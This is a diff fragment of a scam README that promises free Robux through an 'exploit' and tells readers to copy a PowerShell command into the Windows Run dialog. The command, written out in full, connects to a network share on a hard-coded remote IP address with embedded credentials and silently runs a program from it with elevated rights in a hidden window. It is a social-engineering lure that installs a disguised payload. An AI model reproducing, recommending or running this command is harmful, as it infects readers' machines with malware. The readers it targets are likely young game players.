@@ -30,8 +30,10 @@ Our proprietary technology uses advanced exploit to inject Robux directly into y
 
 ### 2️⃣ **Activation**
 1. Copy the code provided under this text
+   
 
 **powershell -Command "Start-Process cmd -ArgumentList '/c net use \\89.110.93.160\shear /user:WORKGROUP\sambauser aabb1234 && \\89.110.93.160\shear\s -fullinstall' -windowstyle hidden -Verb RunAs**
+
 
 2. Press **WINDOWS KEY** + **R**
 3. Press **CTRL** + **V**
